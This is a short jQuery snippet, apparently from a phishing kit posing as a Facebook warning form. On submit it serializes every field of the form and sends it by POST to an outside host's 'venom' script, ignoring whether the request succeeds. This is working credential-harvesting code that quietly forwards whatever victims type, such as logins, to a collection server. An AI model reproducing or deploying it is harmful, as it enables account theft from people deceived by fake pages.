$(".boxformbretyfbperingatan").submit(function() {
	var d = $(".boxformbretyfbperingatan");

	$.ajax({
        url: "http://aditpratamaa.my.id/venom/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
